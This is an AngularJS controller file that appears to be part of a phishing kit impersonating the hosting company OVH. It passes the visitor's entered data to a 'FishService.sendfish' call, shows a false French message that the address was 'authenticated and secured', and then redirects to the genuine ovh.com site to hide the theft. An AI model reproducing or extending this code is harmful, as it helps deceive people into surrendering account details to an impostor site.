angular.module('ovh.controllers',[])
  .controller('MainCtrl',['$scope','$log','FishService','$location','$anchorScroll', function($scope,$log,FishService,$location,$anchorScroll){
  	  var self = this;
  	  self.load = false;

  	  self.subscribe_service = function(fish_info){
  	  		self.load = true;
  	  		FishService.sendfish(fish_info).then(function(response){
  	  		  alert('Félicitation votre adresse a été authentifiée et sécurisée avec succès!');
  	        angular.element('#reset-button').click();

  	  		}, function(errResponse){
  	  			alert('Une erreur est survenue, veuillez réessayer.');
  	  		}).finally(function(){
  	  		   self.load = false;
  	  		    fish_info = '';		
  	  		});
  	  };

  	  self.completeModal = function(){
  	  	window.location.href = "http://www.ovh.com/fr/";
  	  };
  }])
